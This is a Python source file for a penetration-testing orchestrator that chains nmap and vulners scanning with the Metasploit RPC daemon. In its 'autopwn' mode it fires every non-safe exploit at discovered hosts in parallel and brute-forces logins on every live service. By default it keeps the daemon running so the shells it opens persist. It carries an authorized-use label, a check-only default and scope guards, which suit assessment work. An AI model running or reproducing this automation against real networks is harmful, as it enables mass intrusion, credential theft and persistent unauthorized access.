"""
orchestrator.py - entry point and pipeline coordination.

Resolves scope (single IPs, CIDRs, ranges, hostnames) with dedup, excludes, and a
size guard, runs preflight and the firewall disable, then drives the per-host
pipeline. Discovery is one bulk SYN pass (chunked for large scope). Everything
after is per-host parallel on a bounded pool: vulners scan, candidate assembly,
and check. Detonation runs on a separate, smaller pool so blocked fires never
starve the scan workers.

The run is done when no host remains in a non-terminal state, with one nuance:
in check mode an exploitable host is finished, while in autopwn it stays pending
until fired. Teardown is sequenced once by a single signal handler: stop new work,
drain in-flight, restore the firewall, flush a final checkpoint and findings, stop
the TUI. The firewall also has its own atexit backstop from system.py.
"""

from __future__ import annotations

import argparse
import datetime
import ipaddress
import json
import logging
import os
import re
import secrets
import shutil
import signal
import socket
import stat
import subprocess
import sys
import tempfile
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass

from state import (RunState, HostState, Candidate, Verdict, TERMINAL_STATES,
                   is_exploitable_verdict, is_fireable_verdict)
from scanner import Scanner, ScanConfig, NmapError, nse_scripts_for_cve
from msf import (MsfClient, MsfConfig, RANK_VALUES, BRUTE_USER_SEED,
                 BRUTE_PASS_SEED, login_module_for, locate_wordlist,
                 write_builtin_wordlists)
from system import (preflight, PreflightError, FirewallManager, MsfdManager,
                    find_msfrpcd, resolve_run_as, ensure_runtime,
                    DEFAULT_VENV_DIR, RUNTIME_DEPS)

logger = logging.getLogger(__name__)

# Fire ordering in autopwn: confirmed-vulnerable first, then likely, then
# unsupported (no-check backdoors), then unknown. Only SAFE is never fired.
_FIRE_PRIORITY = {Verdict.VULNERABLE: 4, Verdict.LIKELY: 3,
                  Verdict.UNSUPPORTED: 2, Verdict.UNKNOWN: 1}
_RANK_ORDER = RANK_VALUES


@dataclass
class OrchestratorConfig:
    workers: int = 10
    fire_workers: int = 16           # concurrent (host, service) fires; LPORT pool is the ceiling
    brute_workers: int = 16          # concurrent (host, service) login scanners
    chunk_size: int = 2048
    checkpoint_interval: float = 15.0
    poll_interval: float = 0.25
    headless_status_interval: float = 5.0
    keep_msfrpcd: bool = False       # force-keep even with no open sessions


DEFAULT_CONFIG_FILE = ".orchestration_config"


class OrchestrationConfig:
    """Persisted run config in the working directory, mode 0600. Holds the msfrpcd
    RPC password (so unattended runs reuse one credential) and the resolved msfrpcd
    binary path (so a nonstandard install is located once, not every run). Both
    point at or guard a localhost-bound daemon, so a 0600 root-owned JSON file is
    the right place. JSON so it can grow without a format change."""

    def __init__(self, path=DEFAULT_CONFIG_FILE):
        self.path = path

    # -- accessors --

    def read_password(self):
        pw = self._load().get("msf_rpc_password", "")
        return pw if isinstance(pw, str) else ""

    def ensure_password(self):
        """Return the stored password, generating and persisting one if absent."""
        data = self._load()
        pw = data.get("msf_rpc_password", "")
        if isinstance(pw, str) and pw:
            return pw
        pw = secrets.token_urlsafe(32)
        data["msf_rpc_password"] = pw
        data.setdefault("version", 1)
        data.setdefault(
            "created",
            datetime.datetime.now(datetime.timezone.utc).isoformat())
        self._save(data)
        logger.info("generated msfrpcd password, stored at %s (0600)",
                    os.path.abspath(self.path))
        return pw

    def read_msfrpcd_path(self):
        p = self._load().get("msfrpcd_path", "")
        return p if isinstance(p, str) else ""

    def set_msfrpcd_path(self, path):
        """Persist the resolved msfrpcd path. No-op if already stored as given."""
        data = self._load()
        if data.get("msfrpcd_path") == path:
            return
        data["msfrpcd_path"] = path
        data.setdefault("version", 1)
        self._save(data)

    def read_brute_wordlists(self):
        """The stored (user_file, pass_file) absolute paths, or ("", "")."""
        d = self._load()
        u, p = d.get("brute_user_file", ""), d.get("brute_pass_file", "")
        return (u if isinstance(u, str) else ""), (p if isinstance(p, str) else "")

    def set_brute_wordlists(self, user_file, pass_file):
        """Persist resolved wordlist paths so later runs skip the locate step."""
        data = self._load()
        if (data.get("brute_user_file") == user_file
                and data.get("brute_pass_file") == pass_file):
            return
        data["brute_user_file"] = user_file
        data["brute_pass_file"] = pass_file
        data.setdefault("version", 1)
        self._save(data)

    # -- file io --

    def _load(self):
        if not os.path.exists(self.path):
            return {}
        self._enforce_perms()
        try:
            with open(self.path, "r") as f:
                data = json.load(f)
        except (OSError, ValueError) as e:
            logger.warning("could not read %s: %s", self.path, e)
            return {}
        return data if isinstance(data, dict) else {}

    def _save(self, data):
        """Atomic 0600 write: temp file in the same dir, then replace."""
        d = os.path.dirname(os.path.abspath(self.path)) or "."
        try:
            fd, tmp = tempfile.mkstemp(prefix=".orch_", dir=d)
        except OSError as e:
            raise PreflightError(f"could not write {self.path}: {e}")
        try:
            os.fchmod(fd, 0o600)
            with os.fdopen(fd, "w") as f:
                f.write(json.dumps(data, indent=2) + "\n")
            os.replace(tmp, self.path)
            self._chown_to_invoker()
        except OSError as e:
            try:
                os.unlink(tmp)
            except OSError:
                pass
            raise PreflightError(f"could not write {self.path}: {e}")

    def _enforce_perms(self):
        try:
            mode = stat.S_IMODE(os.stat(self.path).st_mode)
        except OSError:
            return
        if mode & 0o077:
            logger.warning("%s had loose perms %o; tightening to 0600",
                           self.path, mode)
            try:
                os.chmod(self.path, 0o600)
            except OSError as e:
                logger.warning("could not tighten perms on %s: %s", self.path, e)
        self._chown_to_invoker()

    def _chown_to_invoker(self):
        """Under sudo the file is created root-owned; hand it to the invoking
        user so later non-sudo tools (e.g. msf.py reading the RPC password) can
        read it. No-op when not running as root, not under sudo, or already
        owned by the invoking user."""
        try:
            if os.geteuid() != 0:
                return
        except AttributeError:
            return                          # non-POSIX; nothing to do
        pw = resolve_run_as()
        if pw is None:
            return
        try:
            if os.stat(self.path).st_uid == pw.pw_uid:
                return
            os.chown(self.path, pw.pw_uid, pw.pw_gid)
            logger.info("chowned %s to %s (sudo invoker)", self.path, pw.pw_name)
        except OSError as e:
            logger.warning("could not chown %s to invoking user: %s",
                           self.path, e)


def _first_line(path):
    """First non-empty, stripped line of a file, or "" if unreadable/empty."""
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            for line in f:
                s = line.strip()
                if s:
                    return s
    except OSError:
        pass
    return ""


class Orchestrator:
    def __init__(self, run: RunState, scanner: Scanner, msf_client: MsfClient,
                 firewall: FirewallManager, msfd: MsfdManager,
                 cfg: OrchestratorConfig, config_file: OrchestrationConfig = None):
        self.run = run
        self.scanner = scanner
        self.msf = msf_client
        self.fw = firewall
        self.msfd = msfd
        self.cfg = cfg
        self.config_file = config_file or OrchestrationConfig()
        self._scan_pool = None
        self._fire_pool = None
        self._brute_pool = None
        self._stop = threading.Event()
        self._teardown_done = False
        self._teardown_lock = threading.Lock()
        self._completed = False         # True only on normal completion (no signal)
        self._discovered_ports = {}
        self._wordlists = None           # (user_file, pass_file, temp_files), resolved once
        # Fire runs one task per (host, service) so a host's services fire in
        # parallel; these track outstanding services per host so the host finalizes
        # to exploited/failed only when its last service completes.
        self._fire_lock = threading.Lock()
        self._fire_pending = {}          # ip -> outstanding service-fire count
        self._fire_got = {}              # ip -> any session opened on the host

    # -- lifecycle --

    def run_pipeline(self, display=None):
        self._install_signal_handlers()
        try:
            self.fw.disable()
            self._discover_phase()
            # Resolve wordlists once, before firing, so credentialed exploits can
            # draw a default USERNAME/PASSWORD from the seclists top entries, and so
            # the brute phase reuses the same resolution. autopwn only.
            if self.run.mode == "autopwn":
                self._prime_credentials()
            self.run.set_phase("scan")
            self._scan_pool = ThreadPoolExecutor(
                max_workers=self.cfg.workers, thread_name_prefix="scan")
            self._fire_pool = ThreadPoolExecutor(
                max_workers=self.cfg.fire_workers, thread_name_prefix="fire")
            for ip in self._resumable_hosts():
                if self._stop.is_set():
                    break
                self._scan_pool.submit(self._process_host, ip)
            self._main_loop(display)
            # The brute phase runs once the whole fire pipeline has drained, on a
            # clean completion only (a signal skips it). autopwn-only: check mode
            # has no fire step to follow.
            if not self._stop.is_set() and self.run.mode == "autopwn":
                self._brute_phase(display)
            # Normal completion means we ended on _is_done, not a signal.
            self._completed = not self._stop.is_set()
        finally:
            self._teardown(display)

    def _install_signal_handlers(self):
        try:
            signal.signal(signal.SIGINT, self._on_signal)
            signal.signal(signal.SIGTERM, self._on_signal)
        except ValueError:
            # not in main thread (e.g. under a test harness); skip
            logger.debug("signal handlers not installed (not main thread)")

    def _on_signal(self, signum, frame):
        if self._stop.is_set():
            logger.warning("shutdown already in progress; waiting for safe "
                           "teardown (firewall restore)")
            return
        logger.warning("signal %d received; graceful shutdown", signum)
        self._stop.set()

    # -- discovery --

    def _discover_phase(self):
        self.run.set_phase("discovery")
        queued = [ip for ip in self.run.pending_hosts()
                  if self.run.get_state(ip) == HostState.QUEUED]
        for chunk in _chunks(queued, self.cfg.chunk_size):
            if self._stop.is_set():
                break
            try:
                results = self.scanner.discover(chunk)
            except NmapError as e:
                logger.error("discovery failed for a chunk of %d: %s",
                             len(chunk), e)
                for ip in chunk:
                    self.run.set_error(ip, f"discovery failed: {e}")
                continue
            for ip in chunk:
                dr = results.get(ip)
                if dr is not None and dr.up:
                    if dr.hostname:
                        self.run.set_hostname(ip, dr.hostname)
                    self.run.set_services(ip, dr.services)
                    self._discovered_ports[ip] = [s.port for s in dr.services]
                    self.run.transition(ip, HostState.DISCOVERED)
                else:
                    self.run.transition(ip, HostState.DOWN)
            self.run.save_checkpoint()
        live = self.run.stats().live
        self.run.record_activity("phase", f"discovered {live} live host(s)")
        logger.info("discovery complete: %d live host(s)", live)

    def _resumable_hosts(self):
        # after discovery: hosts in any non-terminal, non-queued state
        return [ip for ip in self.run.pending_hosts()
                if self.run.get_state(ip) != HostState.QUEUED]

    # -- per-host pipeline (resumes from current stable state) --

    def _process_host(self, ip):
        if self._stop.is_set():
            return
        with self.run.worker_slot():
            try:
                state = self.run.get_state(ip)
                if state == HostState.DISCOVERED:
                    self._do_scan(ip)
                    state = self.run.get_state(ip)
                    if state in TERMINAL_STATES:
                        return
                if state == HostState.ANALYZED:
                    self._do_analyze(ip)
                    state = self.run.get_state(ip)
                    if state in TERMINAL_STATES:
                        return
                if state == HostState.CANDIDATES:
                    # autopwn fires every ranked candidate with no pre-check; only
                    # check mode runs the per-candidate check phase. The fire loop
                    # tries candidates in rank order until one lands.
                    if self.run.mode == "autopwn":
                        self.run.transition(ip, HostState.EXPLOITABLE)
                    else:
                        self._do_check(ip)
                    state = self.run.get_state(ip)
                    if state in TERMINAL_STATES:
                        return
                if state == HostState.EXPLOITABLE and self.run.mode == "autopwn":
                    self._submit_fire(ip)
            except Exception as e:
                self.run.set_error(ip, f"pipeline error: {e}")
                logger.exception("pipeline failed for %s", ip)

    def _submit_fire(self, ip):
        if self._stop.is_set():
            return
        self.run.transition(ip, HostState.EXPLOITING)
        host = self.run.host_copy(ip)
        groups = self._service_groups(host)
        if not groups:
            self.run.transition(ip, HostState.FAILED)
            return
        with self._fire_lock:
            self._fire_pending[ip] = len(groups)
            self._fire_got[ip] = False
        for key, cands in groups.items():
            try:
                self._fire_pool.submit(self._fire_service_wrapper, ip, key, cands)
            except RuntimeError:
                # Pool shutting down during teardown. Account for the un-submitted
                # service so the host still finalizes rather than hanging pending.
                self._service_done(ip, False)

    def _service_groups(self, host):
        """Group a host's fireable candidates by service, preserving rank order
        within each group. The same daemon on two ports (Samba 139/445, UnrealIRCd
        6667/6697) shares one product key so it is one group -- a session on either
        port satisfies it. Each group fires as one parallel task; the group stops at
        its first session, so a risky overflow like trans2open is never fired at a
        daemon usermap_script already popped on this port or its sibling."""
        port_service = {}
        for svc in host.services:
            port_service[svc.port] = svc.product or f"port-{svc.port}"
        groups = {}
        for cand in _fireable(host):
            key = port_service.get(cand.port, f"port-{cand.port}")
            groups.setdefault(key, []).append(cand)
        return groups

    def _fire_service_wrapper(self, ip, key, cands):
        if self._stop.is_set():
            self._service_done(ip, False)
            return
        got = False
        with self.run.worker_slot():
            try:
                got = self._do_fire_service(ip, cands)
            except Exception:
                logger.exception("fire failed for %s service %s", ip, key)
        self._service_done(ip, got)

    def _do_fire_service(self, ip, cands):
        """Fire one service's candidates in rank order, stopping at the first
        session. Returns True if a session opened. Runs concurrently with the
        host's other services on the fire pool."""
        host = self.run.host_copy(ip)
        for cand in cands:
            if self._stop.is_set():
                break
            session, status, detail = self.msf.fire(cand, host, ip, cand.port)
            self.run.update_candidate_fire(ip, cand.module, status, detail)
            if session is not None:
                self.run.add_session(ip, session)
                return True
        return False

    def _service_done(self, ip, got):
        """Record a finished service fire and finalize the host when its last
        service completes: exploited if any service opened a session, else failed."""
        with self._fire_lock:
            if ip not in self._fire_pending:
                return
            if got:
                self._fire_got[ip] = True
            self._fire_pending[ip] -= 1
            if self._fire_pending[ip] > 0:
                return
            self._fire_pending.pop(ip, None)
            final_got = self._fire_got.pop(ip, False)
        self.run.transition(
            ip, HostState.EXPLOITED if final_got else HostState.FAILED)

    def _do_scan(self, ip):
        self.run.transition(ip, HostState.SCANNING)
        if self.scanner.cfg.full_ports:
            # Single pass: SYN-sweep every port, version-detect and vulners the
            # ones found open. Discovery already confirmed the host is up.
            hostname, os_family, services = self.scanner.vulners_scan(ip)
        else:
            ports = self._discovered_ports.get(ip) or self._ports_from_state(ip)
            hostname, os_family, services = self.scanner.vulners_scan(ip, ports)
        if hostname:
            self.run.set_hostname(ip, hostname)
        if os_family:
            self.run.set_fingerprint(ip, os_match=os_family)
        self.run.set_services(ip, services)
        self.run.transition(ip, HostState.ANALYZED)

    def _do_analyze(self, ip):
        host = self.run.host_copy(ip)
        candidates = []
        for svc in host.services:
            candidates.extend(
                self.msf.candidates_for_service(svc, host.os_match))
        if not candidates:
            self.run.transition(ip, HostState.NO_CANDIDATES)
            return
        self.run.set_candidates(ip, candidates)
        self.run.transition(ip, HostState.CANDIDATES)

    def _do_check(self, ip):
        self.run.transition(ip, HostState.CHECKING)
        host = self.run.host_copy(ip)
        msf_cands = [c for c in host.candidates if c.source == "msf"]
        # reset to msf-only so a resumed partial check does not duplicate nse rows
        self.run.set_candidates(ip, msf_cands)
        any_exploitable = False
        any_fireable = False
        nse_done = set()
        for cand in msf_cands:
            if self._stop.is_set():
                break
            verdict, detail = self.msf.check(cand, ip, cand.port)
            self.run.update_candidate_result(ip, cand.module, verdict, detail)
            if is_exploitable_verdict(verdict):
                any_exploitable = True
            if is_fireable_verdict(verdict):
                any_fireable = True
            scripts = nse_scripts_for_cve(cand.cve_id)
            if scripts:
                key = (cand.port, tuple(scripts))
                if key in nse_done:
                    continue
                nse_done.add(key)
                nv, nd = self.scanner.nse_verify(ip, cand.port, scripts)
                self.run.add_candidate(ip, Candidate(
                    module=",".join(scripts), cve_id=cand.cve_id, rank="nse",
                    port=cand.port, source="nse", check_result=nv,
                    check_detail=nd))
                if is_exploitable_verdict(nv):
                    any_exploitable = True
        # In autopwn, anything the check did not rule out (non-SAFE) is worth
        # firing -- backdoor modules report UNSUPPORTED yet are the real way in.
        # In check mode, EXPLOITABLE stays strict (confirmed/likely only).
        if self.run.mode == "autopwn":
            enter_fire = any_fireable
        else:
            enter_fire = any_exploitable
        logger.info("check done %s: %d candidate(s) exploitable=%s fireable=%s "
                    "-> %s", ip, len(msf_cands), any_exploitable, any_fireable,
                    "fire" if (enter_fire and self.run.mode == "autopwn")
                    else ("EXPLOITABLE" if enter_fire else "not exploitable"))
        self.run.transition(
            ip, HostState.EXPLOITABLE if enter_fire
            else HostState.NOT_EXPLOITABLE)

    def _ports_from_state(self, ip):
        host = self.run.host_copy(ip)
        return [s.port for s in host.services] if host else []

    # -- main loop and completion --

    def _is_done(self):
        pending = self.run.pending_hosts()
        if self.run.mode == "check":
            pending = [ip for ip in pending
                       if self.run.get_state(ip) != HostState.EXPLOITABLE]
        return len(pending) == 0

    def _main_loop(self, display):
        last_ckpt = time.time()
        last_status = time.time()
        while not self._stop.is_set():
            if display is not None:
                try:
                    display.refresh()
                except Exception:
                    logger.exception("display refresh error")
            now = time.time()
            if now - last_ckpt >= self.cfg.checkpoint_interval:
                self.run.save_checkpoint()
                last_ckpt = now
            if display is None and now - last_status >= self.cfg.headless_status_interval:
                s = self.run.stats()
                logger.info("progress: %d/%d done, %d exploitable, %d sessions, "
                            "%d workers", s.completed, s.total, s.exploitable,
                            s.sessions, s.active_workers)
                last_status = now
            if self._is_done():
                break
            time.sleep(self.cfg.poll_interval)

    # -- brute phase --

    def _brute_phase(self, display):
        """One global credential-brute phase after the fire pipeline drains. Brutes
        every accessible service on every live host with an MSF login scanner,
        fanned across the brute pool, stop-on-first-success per service. Runs
        regardless of exploit outcome: a working credential is its own finding,
        and session-capable services open shells alongside the exploit sessions."""
        targets = self._brute_targets()
        if not targets:
            return
        self.run.set_phase("brute")
        user_file, pass_file, _ = self._resolve_wordlists()
        self.run.record_activity(
            "brute", f"brute phase: {len(targets)} service(s), "
                     f"users={os.path.basename(user_file)} "
                     f"passwords={os.path.basename(pass_file)}")
        self._brute_pool = ThreadPoolExecutor(
            max_workers=self.cfg.brute_workers, thread_name_prefix="brute")
        try:
            futures = [self._brute_pool.submit(self._brute_wrapper, t,
                                               user_file, pass_file)
                       for t in targets]
            self._await_brute(futures, display)
        finally:
            self._brute_pool.shutdown(wait=True)
            self.run.save_checkpoint()

    def _brute_targets(self):
        """One (ip, service, login_module, port) per distinct login scanner on each
        live host, lowest port first so SMB on 139/445 is bruted once."""
        skip = (HostState.DOWN, HostState.QUEUED)
        targets = []
        for host in self.run.snapshot_hosts():
            if host.state in skip or not host.services:
                continue
            seen = set()
            for svc in sorted(host.services, key=lambda s: s.port):
                module = login_module_for(svc.name, svc.port)
                if not module or module in seen:
                    continue
                seen.add(module)
                targets.append((host.ip, svc.name or "", module, svc.port))
        return targets

    def _brute_wrapper(self, target, user_file, pass_file):
        if self._stop.is_set():
            return
        ip, service, module, port = target
        with self.run.worker_slot():
            try:
                creds, sessions = self.msf.brute_service(
                    service, module, ip, port, user_file, pass_file)
                for c in creds:
                    self.run.add_credential(ip, c)
                    self.run.record_activity(
                        "brute", f"{ip}:{port} {service} cred "
                                 f"{c.username}:{c.password or '(blank)'}")
                for s in sessions:
                    self.run.add_session(ip, s)
            except Exception as e:
                logger.exception("brute failed for %s:%s (%s)", ip, port, service)
                self.run.record_activity("brute", f"{ip}:{port} brute error: {e}")

    def _await_brute(self, futures, display):
        last_ckpt = time.time()
        while not self._stop.is_set():
            if display is not None:
                try:
                    display.refresh()
                except Exception:
                    logger.exception("display refresh error")
            now = time.time()
            if now - last_ckpt >= self.cfg.checkpoint_interval:
                self.run.save_checkpoint()
                last_ckpt = now
            if all(f.done() for f in futures):
                break
            time.sleep(self.cfg.poll_interval)

    def _prime_credentials(self):
        """Resolve the wordlists up front and seed the default credential used to
        fill required USERNAME/PASSWORD options on credentialed exploits, from the
        list top entries. Cheap and idempotent; the brute phase reuses the result."""
        user_file, pass_file, _ = self._resolve_wordlists()
        self.msf.cfg.cred_user = _first_line(user_file) or self.msf.cfg.cred_user
        self.msf.cfg.cred_pass = _first_line(pass_file) or self.msf.cfg.cred_pass
        if self.msf.cfg.cred_user:
            logger.info("default credential for credentialed exploits: %s / %s",
                        self.msf.cfg.cred_user, self.msf.cfg.cred_pass)

    def _resolve_wordlists(self):
        """(user_file, pass_file, temp_files_to_clean), resolved once per run and
        memoized so fire-time credential priming and the brute phase share it.
        Prefer paths stored in the config; else `locate` the seed files and store
        the hits; else fall back to the built-in lists written to temp files (left
        out of the config so a later run can find real lists once updatedb has run).
        A stored path that has since vanished is treated as absent and re-resolved.
        Temp files are removed in teardown."""
        if self._wordlists is not None:
            return self._wordlists
        user, passw = self.config_file.read_brute_wordlists()
        if user and passw and os.path.isfile(user) and os.path.isfile(passw):
            self._wordlists = (user, passw, [])
            return self._wordlists
        located_user = locate_wordlist(BRUTE_USER_SEED)
        located_pass = locate_wordlist(BRUTE_PASS_SEED)
        if located_user and located_pass:
            self.config_file.set_brute_wordlists(located_user, located_pass)
            logger.info("brute wordlists located: users=%s passwords=%s",
                        located_user, located_pass)
            self._wordlists = (located_user, located_pass, [])
            return self._wordlists
        u, p = write_builtin_wordlists()
        logger.info("brute wordlists not found via locate; using built-in lists")
        self._wordlists = (u, p, [u, p])
        return self._wordlists

    # -- teardown --

    def _teardown(self, display):
        with self._teardown_lock:
            if self._teardown_done:
                return
            self._teardown_done = True
        self._stop.set()
        self.run.set_phase("teardown")
        logger.info("tearing down")
        if self._scan_pool is not None:
            self._scan_pool.shutdown(wait=True, cancel_futures=True)
        if self._fire_pool is not None:
            self._fire_pool.shutdown(wait=True, cancel_futures=True)
        if self._wordlists is not None:
            for p in self._wordlists[2]:
                try:
                    os.unlink(p)
                except OSError:
                    pass
        try:
            self.fw.restore()
        except Exception:
            logger.exception("firewall restore in teardown failed")
        try:
            self.run.save_checkpoint()
        except Exception:
            logger.exception("final checkpoint failed")
        try:
            path = self.run.write_findings()
            if path:
                logger.info("findings written to %s", path)
        except Exception:
            logger.exception("findings write failed")
        self._log_blocked_fires()
        if display is not None:
            if self._completed:
                # Host is already safe here (firewall restored, findings written),
                # so holding the dashboard open for review exposes nothing.
                try:
                    display.wait_for_exit()
                except Exception:
                    pass
            try:
                display.stop()
            except Exception:
                pass
        # Decide msfrpcd disposition before closing the client: by default keep
        # the daemon alive when it holds open sessions, so the access gained
        # survives the run. --keep-msfrpcd forces keep even with none. We only
        # ever stop a daemon we started; a pre-existing one is always left alone.
        keep = self.cfg.keep_msfrpcd
        if not keep:
            try:
                keep = len(self.msf.session_list()) > 0
            except Exception:
                keep = self.run.stats().sessions > 0
        try:
            self.msf.close()
        except Exception:
            pass
        try:
            if keep:
                pid = self.msfd.detach()
                logger.info("msfrpcd left running%s; reach sessions with "
                            "'python msf.py' (list) or 'python msf.py -i <id>'",
                            f" (pid {pid})" if pid else "")
            else:
                self.msfd.stop()
        except Exception:
            logger.exception("msfrpcd disposition in teardown failed")

    def _log_blocked_fires(self):
        """Surface every candidate that never got a fair attempt: an option we
        could not set or that was rejected, no payload or LHOST, an empty LPORT
        pool, MSF refusing the module, or an exception mid-fire. These are tooling
        gaps, not clean negatives, so they are reported at WARNING on exit and
        must never be read as the host being safe."""
        blocked = []
        for h in self.run.snapshot_hosts():
            for c in h.candidates:
                if c.fire_status in ("blocked", "error"):
                    blocked.append((h.ip, c.module, c.fire_status, c.fire_detail))
        if not blocked:
            return
        logger.warning("%d candidate(s) could not be fired (config/option gaps, "
                       "review before trusting these hosts):", len(blocked))
        for ip, module, status, detail in blocked:
            logger.warning("  %s %s @ %s: %s", status, module, ip,
                           detail or "(no detail)")


# --- fire candidate selection ----------------------------------------------

def _fireable(host):
    out = []
    for c in host.candidates:
        if c.source != "msf":
            continue
        if c.check_result == Verdict.SAFE:
            continue
        out.append(c)
    out.sort(key=lambda c: (_FIRE_PRIORITY.get(c.check_result, 0),
                            _RANK_ORDER.get(c.rank, 0)), reverse=True)
    return out


# --- scope expansion -------------------------------------------------------

def _local_ips():
    """All local interface IP addresses (v4 and v6), normalized, for self-exclusion.
    Uses `ip -o addr`, falling back to `hostname -I`. Enumerating every interface
    (not one routing lookup) catches a multi-homed tester with several addresses on
    the scanned network."""
    raw = set()
    try:
        out = subprocess.run(
            ["ip", "-o", "addr", "show"], stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            timeout=10, text=True).stdout
        raw.update(re.findall(r"inet6?\s+([0-9A-Fa-f:.]+)/", out))
    except (OSError, subprocess.SubprocessError):
        pass
    if not raw:
        try:
            out = subprocess.run(
                ["hostname", "-I"], stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                timeout=10, text=True).stdout
            raw.update(out.split())
        except (OSError, subprocess.SubprocessError):
            pass
    norm = set()
    for x in raw:
        try:
            norm.add(str(ipaddress.ip_address(x)))
        except ValueError:
            pass
    return norm


def expand_targets(specs, max_hosts=None):
    """Expand IPs, CIDRs, ranges, and hostnames into a deduped IP list. Counts
    lazily and aborts before materializing an oversized CIDR."""
    seen = {}
    for spec in specs:
        for ip in _expand_one(spec):
            if ip not in seen:
                seen[ip] = None
                if max_hosts and len(seen) > max_hosts:
                    raise SystemExit(
                        f"scope exceeds --max-hosts {max_hosts}; refine scope")
    return list(seen)


def _expand_one(spec):
    spec = (spec or "").strip()
    if not spec or spec.startswith("#"):
        return
    if "/" in spec:
        net = ipaddress.ip_network(spec, strict=False)
        yielded = False
        for h in net.hosts():
            yielded = True
            yield str(h)
        if not yielded:
            yield str(net.network_address)
        return
    if "-" in spec and not _looks_like_hostname(spec):
        yield from _expand_range(spec)
        return
    try:
        yield str(ipaddress.ip_address(spec))
        return
    except ValueError:
        pass
    for ip in _resolve(spec):
        yield ip


def _expand_range(spec):
    left, right = spec.split("-", 1)
    left, right = left.strip(), right.strip()
    start = ipaddress.ip_address(left)
    if "." in right or ":" in right:
        end = ipaddress.ip_address(right)
    else:
        base = left.rsplit(".", 1)[0]
        end = ipaddress.ip_address(f"{base}.{right}")
    lo, hi = (int(start), int(end))
    if hi < lo:
        lo, hi = hi, lo
    for i in range(lo, hi + 1):
        yield str(ipaddress.ip_address(i))


def _looks_like_hostname(spec):
    # a dash inside a label that is not an ip range (e.g. my-host.example.com)
    head = spec.split("-", 1)[0].strip()
    try:
        ipaddress.ip_address(head)
        return False
    except ValueError:
        return True


def _resolve(spec):
    try:
        infos = socket.getaddrinfo(spec, None)
    except OSError as e:
        logger.warning("could not resolve '%s': %s", spec, e)
        return []
    out = {}
    for info in infos:
        addr = info[4][0]
        out[addr] = None
    return list(out)


# --- cli -------------------------------------------------------------------

def _read_lines(path):
    with open(path) as f:
        return [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]


def _chunks(seq, n):
    for i in range(0, len(seq), n):
        yield seq[i:i + n]


def _scope_guard(targets, args):
    n = len(targets)
    if n > args.max_hosts:
        raise SystemExit(
            f"scope is {n} hosts, exceeds --max-hosts {args.max_hosts}; "
            "refine scope or raise --max-hosts")
    if n > args.confirm_threshold and not args.yes:
        if sys.stdin.isatty():
            resp = input(f"Scope is {n} hosts. Proceed? [y/N] ").strip().lower()
            if resp not in ("y", "yes"):
                raise SystemExit("aborted")
        else:
            raise SystemExit(
                f"scope is {n} hosts (over --confirm-threshold "
                f"{args.confirm_threshold}); pass --yes to run non-interactively")


def _setup_logging(args):
    level = logging.DEBUG if args.verbose else logging.INFO
    handlers = []
    if args.no_tui:
        handlers.append(logging.StreamHandler(sys.stderr))
    logfile = args.log_file or (None if args.no_tui else "vapt_run.log")
    if logfile:
        handlers.append(logging.FileHandler(logfile))
    fmt = logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s")
    root = logging.getLogger()
    root.setLevel(level)
    for h in handlers:
        h.setFormatter(fmt)
        root.addHandler(h)


def _parse_args(argv):
    p = argparse.ArgumentParser(
        prog="vapt-orchestrator",
        description="nmap + vulners + metasploit orchestration (authorized use)")
    p.add_argument("targets", nargs="*", help="IPs, CIDRs, ranges, or hostnames")
    p.add_argument("-iL", "--target-file", help="file of targets, one per line")
    p.add_argument("--exclude", action="append", default=[],
                   help="exclude a target spec (repeatable)")
    p.add_argument("--exclude-file", help="file of exclusions, one per line")
    p.add_argument("--include-self", action="store_true",
                   help="do not auto-exclude the tester's own in-scope addresses")
    p.add_argument("--mode", choices=("check", "autopwn"), default="check",
                   help="check only (default) or autopwn (fire)")
    p.add_argument("--workers", type=int, default=10)
    p.add_argument("--fire-workers", type=int, default=16)
    p.add_argument("--chunk-size", type=int, default=2048)
    p.add_argument("--checkpoint-interval", type=float, default=15.0)
    p.add_argument("--top-ports", type=int, default=1000,
                   help="phase 1 discovery: top N ports for liveness")
    p.add_argument("--ports", default="", help="phase 1 discovery -p override")
    p.add_argument("--no-full-ports", action="store_true",
                   help="phase 2: scan only discovered ports instead of all 65535")
    p.add_argument("--mincvss", type=float, default=7.0)
    p.add_argument("--timing", default="-T4")
    p.add_argument("--candidates-per-service", type=int, default=5)
    p.add_argument("--min-rank", default="good",
                   choices=sorted(RANK_VALUES, key=RANK_VALUES.get),
                   help="minimum Metasploit exploit rank to consider (default good)")
    p.add_argument("--no-product-search", action="store_true",
                   help="search Metasploit by CVE only, not by service/product "
                        "name (skips name-keyed modules like distcc_exec)")
    p.add_argument("--lhost", default="", help="pin LHOST (else derived per target)")
    p.add_argument("--max-hosts", type=int, default=65536)
    p.add_argument("--confirm-threshold", type=int, default=4096)
    p.add_argument("--yes", action="store_true", help="skip scope confirmation")
    p.add_argument("--checkpoint", default="vapt_run_checkpoint.json")
    p.add_argument("--findings", default="vapt_findings.json")
    p.add_argument("--resume", action="store_true",
                   help="resume from --checkpoint")
    p.add_argument("--no-tui", action="store_true", help="headless")
    p.add_argument("--nmap-path", default="nmap")
    p.add_argument("--msf-host", default=None)
    p.add_argument("--msf-port", type=int, default=None)
    p.add_argument("--msf-pass", default=None, help="else MSF_RPC_PASS env")
    ssl = p.add_mutually_exclusive_group()
    ssl.add_argument("--msf-ssl", dest="msf_ssl", action="store_true", default=None)
    ssl.add_argument("--no-msf-ssl", dest="msf_ssl", action="store_false")
    p.add_argument("--msfrpcd-path", default="msfrpcd",
                   help="path to msfrpcd binary for autostart")
    p.add_argument("--no-msf-autostart", action="store_true",
                   help="do not start msfrpcd; require an already-running daemon")
    p.add_argument("--keep-msfrpcd", action="store_true",
                   help="leave an autostarted msfrpcd running on exit even with "
                        "no open sessions (open sessions are kept either way)")
    p.add_argument("--msf-user", default=None,
                   help="run autostarted msfrpcd as this user (default: the "
                        "sudo-invoking user)")
    p.add_argument("--config-file", default=DEFAULT_CONFIG_FILE,
                   help="persisted run config (msfrpcd password), 0600")
    p.add_argument("--venv-dir", default=DEFAULT_VENV_DIR,
                   help="root-owned venv holding the runtime deps")
    p.add_argument("--no-venv", action="store_true",
                   help="do not bootstrap a venv; use the current interpreter")
